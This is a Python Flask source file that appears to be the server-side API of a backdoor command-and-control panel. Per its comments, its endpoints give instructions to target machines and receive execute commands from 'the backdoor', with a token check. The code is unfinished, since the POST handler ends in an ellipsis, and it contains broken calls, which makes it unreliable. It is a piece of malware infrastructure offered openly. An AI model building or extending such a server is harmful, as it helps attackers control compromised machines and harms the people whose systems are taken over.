from flask import Blueprint,jsonify,request,session
from sqlalchemy.orm import sessionmaker

from db.modle import APICommand,APILink,ApiToken,Instraction
from db.mange_db import config,_create_engine
from utility.email_temp import email_temp
from utility.processer import log,getlist

emailTemplate = email_temp()

Session = sessionmaker(bind=_create_engine())
_session = Session()

api = Blueprint('api',__name__)

# flage and cheack for instraction
@api.route('/api/get_instraction/<target_name>')
def get_instraction(target_name=None):
    if request.method == 'GET' and target_name != None:
        api_token = request.args('token')
        valid = _session.query(ApiToken).filter(token=api_token).first()
        if valid:
            data = getlist(_session.query(Instraction).filter_by(token=api_token).all(),sp=',')
            return {'instraction': data},200
        else:
            return {'Erorr': "Invalid api_token or didn't provid api_token"},404
    else:
        return {'Error': "Unsupported method or didn't provid target name"}

# recive excute command from the backdoor
@api.route('/api/ApiCommand',methods=['POST','GET'])
def apiCommand():
    if request.method == 'GET':
        try:
            api_token = request.args('token')
            valid = _session.query(ApiToken).filter(token=api_token).first()
            if valid:
                apiCommand = getlist(_session.query(APICommand).filter_by().all(),sp=',')
                return {'allCommand': apiCommand},200
            else:
                return {'Erorr': 'Invalid api_token or no api token provided'},404
        except Exception as e:
            log(f"[Error] ocuer at /_api_command method={request.method} ,error={e}")
            _session.rollback()
            return {'error': 'Server side Error'},500
        finally:
            _session.close()
    elif request.method == 'POST':
        api_token = request.args('token')
        valid = _session.query(ApiToken).filter(token=api_token).first()
        if valid:
            ...
    else:
        return {'Error': 'Unsupported method'}
